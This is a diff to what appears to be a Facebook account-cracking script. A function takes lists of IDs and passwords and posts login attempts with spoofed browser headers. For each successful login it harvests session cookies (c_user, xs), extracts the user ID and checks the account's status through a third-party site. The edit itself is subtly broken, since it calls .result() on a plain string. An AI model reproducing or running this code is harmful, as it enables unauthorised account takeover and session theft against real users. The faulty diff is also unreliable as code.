@@ -1515,10 +1515,11 @@ def m6(ids,pwv):
             'sec-fetch-user': '?1',
             'upgrade-insecure-requests': '1',
             'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4425.124 Safari/537.36'}
-            session.post('https://web.facebook.com/login/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNzExNTI2MzE4LCJjYWxsc2l0ZV9pZCI6MzgxMjI5MDc5NTc1OTQ2fQ%3D%3D',data=info,headers=update).text
-            log_cookies=session.cookies.get_dict().keys()
+            future =session.post('https://web.facebook.com/login/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNzExNTI2MzE4LCJjYWxsc2l0ZV9pZCI6MzgxMjI5MDc5NTc1OTQ2fQ%3D%3D',data=info,headers=update).text
+            response = future.result()
+            log_cookies=response.cookies.get_dict().keys()
             if 'c_user' in log_cookies or 'm_page_voice' in log_cookies or 'xs' in log_cookies:
-                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                coki=";".join([key+"="+value for key,value in response.cookies.get_dict().items()])
                 cid = re.findall('c_user=(.*);xs',coki)[0]
                 ckk = f"https://thanhlike.com/modun/tool/get_facebook.php?type=checklive&id={uid}"
                 res = requests.get(ckk).text
